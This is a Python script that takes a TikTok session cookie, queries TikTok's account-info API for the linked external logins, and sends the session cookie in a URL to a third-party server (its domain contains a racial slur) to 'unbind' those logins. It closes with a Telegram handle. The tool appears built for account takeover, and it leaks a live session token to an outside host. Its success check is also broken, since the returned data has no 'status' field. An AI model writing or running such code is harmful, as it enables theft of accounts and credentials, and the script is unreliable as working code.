from requests import get, post
from colorama import Fore
import json
import os

os.system('cls')
apis = ['api16-normal-c-useast1a.tiktokv.com', 'api16-normal-c-useast2a.tiktokv.com']
sessionid = input('sessionid: ')

def check_externals(sessionid):
    try:
        externals = []
        for api in apis:
            url = f'https://{api}/passport/account/info/v2/?aid=1233'
            headers = {
                "sdk-version": "2",
                "cookie": f"sessionid={sessionid}"
            }
            r = get(url, headers=headers).json()
            if r['message'] == 'success':
                break

        if r['message'] != 'success':
            return {'status': 'error', 'message': r['data']['description']}

        for connect in r['data']['connects']:
            externals.append(connect['platform'])

        return {'externals': externals, 'api': api, 'sessionid': sessionid, 'username': r['data']['username']}
    except:
        return {'status': 'error', 'message': 'failed to fetch.'}

def unbind(data):
    try:
        api, sessionid, externals, username = data['api'], data['sessionid'], data['externals'], data['username']
        print(f'{username} - {externals}')
        for external in externals:
            data = json.dumps({"external": external, "sessionid": sessionid, "api": api})
            url = f'https://niggas.love/unbind?data={data}'
            r = get(url).json()
            if r['status'] == 'success':
                print(f'{Fore.GREEN}{external}{Fore.RESET}')
            else:
                print(f'{Fore.RED}{external} - {r["message"]}{Fore.RESET}')
    except Exception as e:
        print(e)
        pass

data = check_externals(sessionid)
if data['status'] == 'success':
    unbind(data)
else:
    print(f'{Fore.RED}{data["message"]}{Fore.RESET}')
input()

# t.me/keyboards
